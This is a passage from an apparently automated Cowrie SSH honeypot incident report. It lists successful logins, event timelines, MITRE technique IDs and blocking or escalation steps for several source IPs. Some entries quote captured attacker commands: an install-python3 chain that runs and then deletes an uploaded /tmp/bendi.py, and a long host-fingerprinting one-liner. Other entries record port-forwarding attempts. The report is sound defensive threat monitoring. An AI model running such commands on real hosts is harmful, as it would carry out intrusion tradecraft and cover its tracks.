| `2026-07-11 06:33:22` | `cowrie.client.kex` |
| `2026-07-11 06:33:22` | `cowrie.login.success` |
| `2026-07-11 06:33:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-297dbe30a239

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-07-11 06:33 |
| **Last Seen** | 2026-07-11 06:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:33:22` | `cowrie.session.connect` |
| `2026-07-11 06:33:22` | `cowrie.client.version` |
| `2026-07-11 06:33:23` | `cowrie.client.kex` |
| `2026-07-11 06:33:25` | `cowrie.login.success` |
| `2026-07-11 06:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df0c06b31b9f

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-07-11 06:33 |
| **Last Seen** | 2026-07-11 06:35 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:33:44` | `cowrie.session.connect` |
| `2026-07-11 06:33:44` | `cowrie.client.version` |
| `2026-07-11 06:33:44` | `cowrie.client.kex` |
| `2026-07-11 06:33:45` | `cowrie.login.success` |
| `2026-07-11 06:33:46` | `cowrie.session.file_upload` |
| `2026-07-11 06:33:47` | `cowrie.session.params` |
| `2026-07-11 06:33:47` | `cowrie.command.input` |
| `2026-07-11 06:33:47` | `cowrie.command.input` |
| `2026-07-11 06:33:47` | `cowrie.command.input` |
| `2026-07-11 06:33:47` | `cowrie.command.failed` |
| `2026-07-11 06:33:48` | `cowrie.log.closed` |
| `2026-07-11 06:33:49` | `cowrie.session.params` |
| `2026-07-11 06:33:49` | `cowrie.command.input` |
| `2026-07-11 06:33:49` | `cowrie.log.closed` |
| `2026-07-11 06:33:50` | `cowrie.session.params` |
| `2026-07-11 06:33:50` | `cowrie.command.input` |
| `2026-07-11 06:33:50` | `cowrie.log.closed` |
| `2026-07-11 06:33:52` | `cowrie.session.params` |
| `2026-07-11 06:33:52` | `cowrie.command.input` |
| `2026-07-11 06:33:52` | `cowrie.command.failed` |
| `2026-07-11 06:33:52` | `cowrie.command.failed` |
| `2026-07-11 06:34:53` | `cowrie.session.params` |
| `2026-07-11 06:34:53` | `cowrie.command.input` |
| `2026-07-11 06:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93848a8261db

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:33 |
| **Last Seen** | 2026-07-11 06:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:33:48` | `cowrie.session.connect` |
| `2026-07-11 06:33:48` | `cowrie.client.version` |
| `2026-07-11 06:33:48` | `cowrie.client.kex` |
| `2026-07-11 06:33:49` | `cowrie.login.success` |
| `2026-07-11 06:33:51` | `cowrie.session.params` |
| `2026-07-11 06:33:51` | `cowrie.command.input` |
| `2026-07-11 06:33:51` | `cowrie.command.input` |
| `2026-07-11 06:33:51` | `cowrie.command.input` |
| `2026-07-11 06:33:51` | `cowrie.command.input` |
| `2026-07-11 06:33:51` | `cowrie.command.input` |
| `2026-07-11 06:33:51` | `cowrie.command.success` |
| `2026-07-11 06:33:51` | `cowrie.command.input` |
| `2026-07-11 06:33:51` | `cowrie.command.input` |
| `2026-07-11 06:33:51` | `cowrie.command.input` |
| `2026-07-11 06:33:51` | `cowrie.command.input` |
| `2026-07-11 06:33:52` | `cowrie.log.closed` |
| `2026-07-11 06:33:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e8f7edf99ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:35 |
| **Last Seen** | 2026-07-11 06:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:35:30` | `cowrie.session.connect` |
| `2026-07-11 06:35:30` | `cowrie.client.version` |
| `2026-07-11 06:35:30` | `cowrie.client.kex` |
| `2026-07-11 06:35:31` | `cowrie.login.success` |
| `2026-07-11 06:35:32` | `cowrie.session.params` |
| `2026-07-11 06:35:32` | `cowrie.command.input` |
| `2026-07-11 06:35:32` | `cowrie.command.input` |
| `2026-07-11 06:35:32` | `cowrie.command.input` |
| `2026-07-11 06:35:32` | `cowrie.command.input` |
| `2026-07-11 06:35:32` | `cowrie.command.input` |
| `2026-07-11 06:35:32` | `cowrie.command.success` |
| `2026-07-11 06:35:32` | `cowrie.command.input` |
| `2026-07-11 06:35:32` | `cowrie.command.input` |
| `2026-07-11 06:35:32` | `cowrie.command.input` |
| `2026-07-11 06:35:32` | `cowrie.command.input` |
| `2026-07-11 06:35:32` | `cowrie.log.closed` |
| `2026-07-11 06:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d55c09766f3b

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-07-11 06:36 |
| **Last Seen** | 2026-07-11 06:38 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:36:09` | `cowrie.session.connect` |
| `2026-07-11 06:36:09` | `cowrie.client.version` |
| `2026-07-11 06:36:09` | `cowrie.client.kex` |
| `2026-07-11 06:36:10` | `cowrie.login.success` |
| `2026-07-11 06:36:12` | `cowrie.session.file_upload` |
| `2026-07-11 06:36:13` | `cowrie.session.params` |
| `2026-07-11 06:36:13` | `cowrie.command.input` |
| `2026-07-11 06:36:13` | `cowrie.command.input` |
| `2026-07-11 06:36:13` | `cowrie.command.input` |
| `2026-07-11 06:36:13` | `cowrie.command.failed` |
| `2026-07-11 06:36:13` | `cowrie.log.closed` |
| `2026-07-11 06:36:14` | `cowrie.session.params` |
| `2026-07-11 06:36:14` | `cowrie.command.input` |
| `2026-07-11 06:36:14` | `cowrie.log.closed` |
| `2026-07-11 06:36:15` | `cowrie.session.params` |
| `2026-07-11 06:36:15` | `cowrie.command.input` |
| `2026-07-11 06:36:16` | `cowrie.log.closed` |
| `2026-07-11 06:36:17` | `cowrie.session.params` |
| `2026-07-11 06:36:17` | `cowrie.command.input` |
| `2026-07-11 06:36:17` | `cowrie.command.failed` |
| `2026-07-11 06:36:17` | `cowrie.command.failed` |
| `2026-07-11 06:37:18` | `cowrie.session.params` |
| `2026-07-11 06:37:18` | `cowrie.command.input` |
| `2026-07-11 06:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-796ac2445f4f

| Field | Detail |
|---|---|
| **Source IP** | `31.28.253[.]144` |
| **First Seen** | 2026-07-11 06:36 |
| **Last Seen** | 2026-07-11 06:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:36:11` | `cowrie.session.connect` |
| `2026-07-11 06:36:12` | `cowrie.client.version` |
| `2026-07-11 06:36:12` | `cowrie.client.kex` |
| `2026-07-11 06:36:13` | `cowrie.login.success` |
| `2026-07-11 06:36:14` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.28.253[.]144` to AbuseIPDB if not already reported
- [ ] Block `31.28.253[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b18941b6b199

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:37 |
| **Last Seen** | 2026-07-11 06:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:37:10` | `cowrie.session.connect` |
| `2026-07-11 06:37:11` | `cowrie.client.version` |
| `2026-07-11 06:37:11` | `cowrie.client.kex` |
| `2026-07-11 06:37:11` | `cowrie.login.success` |
| `2026-07-11 06:37:12` | `cowrie.session.params` |
| `2026-07-11 06:37:12` | `cowrie.command.input` |
| `2026-07-11 06:37:12` | `cowrie.command.input` |
| `2026-07-11 06:37:12` | `cowrie.command.input` |
| `2026-07-11 06:37:12` | `cowrie.command.input` |
| `2026-07-11 06:37:12` | `cowrie.command.input` |
| `2026-07-11 06:37:12` | `cowrie.command.success` |
| `2026-07-11 06:37:12` | `cowrie.command.input` |
| `2026-07-11 06:37:12` | `cowrie.command.input` |
| `2026-07-11 06:37:12` | `cowrie.command.input` |
| `2026-07-11 06:37:12` | `cowrie.command.input` |
| `2026-07-11 06:37:12` | `cowrie.log.closed` |
| `2026-07-11 06:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b32be0f4dcf9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 06:37 |
| **Last Seen** | 2026-07-11 06:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:37:29` | `cowrie.session.connect` |
| `2026-07-11 06:37:29` | `cowrie.client.version` |
| `2026-07-11 06:37:29` | `cowrie.client.kex` |
| `2026-07-11 06:37:29` | `cowrie.login.success` |
| `2026-07-11 06:37:29` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:37:29` | `cowrie.direct-tcpip.data` |
| `2026-07-11 06:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b586e93d609

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:38 |
| **Last Seen** | 2026-07-11 06:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:38:51` | `cowrie.session.connect` |
| `2026-07-11 06:38:51` | `cowrie.client.version` |
| `2026-07-11 06:38:51` | `cowrie.client.kex` |
| `2026-07-11 06:38:52` | `cowrie.login.success` |
| `2026-07-11 06:38:53` | `cowrie.session.params` |
| `2026-07-11 06:38:53` | `cowrie.command.input` |
| `2026-07-11 06:38:53` | `cowrie.command.input` |
| `2026-07-11 06:38:53` | `cowrie.command.input` |
| `2026-07-11 06:38:53` | `cowrie.command.input` |
| `2026-07-11 06:38:53` | `cowrie.command.input` |
| `2026-07-11 06:38:53` | `cowrie.command.success` |
| `2026-07-11 06:38:53` | `cowrie.command.input` |
| `2026-07-11 06:38:53` | `cowrie.command.input` |
| `2026-07-11 06:38:53` | `cowrie.command.input` |
| `2026-07-11 06:38:53` | `cowrie.command.input` |
| `2026-07-11 06:38:54` | `cowrie.log.closed` |
| `2026-07-11 06:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bbff1175ac2

| Field | Detail |
|---|---|
| **Source IP** | `8.221.121[.]6` |
| **First Seen** | 2026-07-11 06:38 |
| **Last Seen** | 2026-07-11 06:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:38:55` | `cowrie.session.connect` |
| `2026-07-11 06:38:55` | `cowrie.client.version` |
| `2026-07-11 06:38:55` | `cowrie.client.kex` |
| `2026-07-11 06:38:55` | `cowrie.login.success` |
| `2026-07-11 06:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.221.121[.]6` to AbuseIPDB if not already reported
- [ ] Block `8.221.121[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9451662ae84

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-11 06:38 |
| **Last Seen** | 2026-07-11 06:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:38:55` | `cowrie.session.connect` |
| `2026-07-11 06:38:55` | `cowrie.client.version` |
| `2026-07-11 06:38:56` | `cowrie.client.kex` |
| `2026-07-11 06:38:56` | `cowrie.login.success` |
| `2026-07-11 06:38:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bed7f5a38f2d

| Field | Detail |
|---|---|
| **Source IP** | `183.99.228[.]131` |
| **First Seen** | 2026-07-11 06:39 |
| **Last Seen** | 2026-07-11 06:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:39:44` | `cowrie.session.connect` |
| `2026-07-11 06:39:45` | `cowrie.client.version` |
| `2026-07-11 06:39:45` | `cowrie.client.kex` |
| `2026-07-11 06:39:48` | `cowrie.login.success` |
| `2026-07-11 06:39:49` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.99.228[.]131` to AbuseIPDB if not already reported
- [ ] Block `183.99.228[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8810a5ce9ab

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]171` |
| **First Seen** | 2026-07-11 06:39 |
| **Last Seen** | 2026-07-11 06:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:39:58` | `cowrie.session.connect` |
| `2026-07-11 06:39:59` | `cowrie.client.version` |
| `2026-07-11 06:39:59` | `cowrie.client.kex` |
| `2026-07-11 06:40:00` | `cowrie.login.success` |
| `2026-07-11 06:40:00` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:40:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]171` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84bcd2b440ff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:40 |
| **Last Seen** | 2026-07-11 06:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:40:29` | `cowrie.session.connect` |
| `2026-07-11 06:40:29` | `cowrie.client.version` |
| `2026-07-11 06:40:29` | `cowrie.client.kex` |
| `2026-07-11 06:40:30` | `cowrie.login.success` |
| `2026-07-11 06:40:31` | `cowrie.session.params` |
| `2026-07-11 06:40:31` | `cowrie.command.input` |
| `2026-07-11 06:40:31` | `cowrie.command.input` |
| `2026-07-11 06:40:31` | `cowrie.command.input` |
| `2026-07-11 06:40:31` | `cowrie.command.input` |
| `2026-07-11 06:40:31` | `cowrie.command.input` |
| `2026-07-11 06:40:31` | `cowrie.command.success` |
| `2026-07-11 06:40:31` | `cowrie.command.input` |
| `2026-07-11 06:40:31` | `cowrie.command.input` |
| `2026-07-11 06:40:31` | `cowrie.command.input` |
| `2026-07-11 06:40:31` | `cowrie.command.input` |
| `2026-07-11 06:40:32` | `cowrie.log.closed` |
| `2026-07-11 06:40:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba28e8688697

| Field | Detail |
|---|---|
| **Source IP** | `112.28.73[.]142` |
| **First Seen** | 2026-07-11 06:41 |
| **Last Seen** | 2026-07-11 06:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:41:47` | `cowrie.session.connect` |
| `2026-07-11 06:41:48` | `cowrie.client.version` |
| `2026-07-11 06:41:48` | `cowrie.client.kex` |
| `2026-07-11 06:41:50` | `cowrie.login.success` |
| `2026-07-11 06:41:51` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.28.73[.]142` to AbuseIPDB if not already reported
- [ ] Block `112.28.73[.]142` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-726ad7ee5aca

| Field | Detail |
|---|---|
| **Source IP** | `200.106.49[.]149` |
| **First Seen** | 2026-07-11 06:41 |
| **Last Seen** | 2026-07-11 06:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:41:56` | `cowrie.session.connect` |
| `2026-07-11 06:41:58` | `cowrie.client.version` |
| `2026-07-11 06:41:58` | `cowrie.client.kex` |
| `2026-07-11 06:41:59` | `cowrie.login.success` |
| `2026-07-11 06:42:00` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:42:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.106.49[.]149` to AbuseIPDB if not already reported
- [ ] Block `200.106.49[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84aeced4f93f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:42 |
| **Last Seen** | 2026-07-11 06:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:42:15` | `cowrie.session.connect` |
| `2026-07-11 06:42:15` | `cowrie.client.version` |
| `2026-07-11 06:42:15` | `cowrie.client.kex` |
| `2026-07-11 06:42:17` | `cowrie.login.success` |
| `2026-07-11 06:42:18` | `cowrie.session.params` |
| `2026-07-11 06:42:18` | `cowrie.command.input` |
| `2026-07-11 06:42:18` | `cowrie.command.input` |
| `2026-07-11 06:42:18` | `cowrie.command.input` |
| `2026-07-11 06:42:18` | `cowrie.command.input` |
| `2026-07-11 06:42:18` | `cowrie.command.input` |
| `2026-07-11 06:42:18` | `cowrie.command.success` |
| `2026-07-11 06:42:18` | `cowrie.command.input` |
| `2026-07-11 06:42:18` | `cowrie.command.input` |
| `2026-07-11 06:42:18` | `cowrie.command.input` |
| `2026-07-11 06:42:18` | `cowrie.command.input` |
| `2026-07-11 06:42:18` | `cowrie.log.closed` |
| `2026-07-11 06:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2031e1a7aed9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:44 |
| **Last Seen** | 2026-07-11 06:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
